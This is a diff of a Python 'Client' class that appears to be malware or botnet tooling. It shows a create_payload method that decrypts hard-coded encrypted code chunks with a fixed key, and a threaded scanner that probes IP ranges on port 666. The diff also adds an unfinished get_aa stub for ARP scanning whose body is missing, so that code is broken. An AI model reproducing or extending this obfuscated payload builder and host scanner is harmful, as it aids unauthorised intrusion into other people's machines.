@@ -8,8 +8,6 @@ import Crypt
 
 class Client(Compiler.Compile,Crypt.Crypt):
 
-
-
     def create_payload(self):
         iv = self.KeyAndIv("8s6Ge9dd", "OVbfVVRciZNgcObT")
         code = ['O0QP3FUgPRMu3mL2NVS+AA==', 'my3R2l1t2UyvaqpPqKkAlU5flXDVetBSIIZENGSZRsI=', 'p/p5rIEYnuq70S5VrYgjaw==',
@@ -79,8 +77,6 @@ class Client(Compiler.Compile,Crypt.Crypt):
         State = 1
         port = 666
         timeout = 0
-
-
 
         if host != 0:
             host = host
@@ -167,6 +163,9 @@ class Client(Compiler.Compile,Crypt.Crypt):
        t7.start()
        t8.start()
 
+    def get_aa(self):
+        #hier weiter machen (arp -a) scannen
+
 
     def sscan(self ,strange,srange,thread):
 
@@ -189,6 +188,8 @@ class Client(Compiler.Compile,Crypt.Crypt):
                     print("scanning with thread " + thread + " targetting IP: " + ip +"\n")
                 else:
                     next
+                if self.args == "aa":
+                    self.get_aa()
 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 res = s.connect_ex((ip,666))
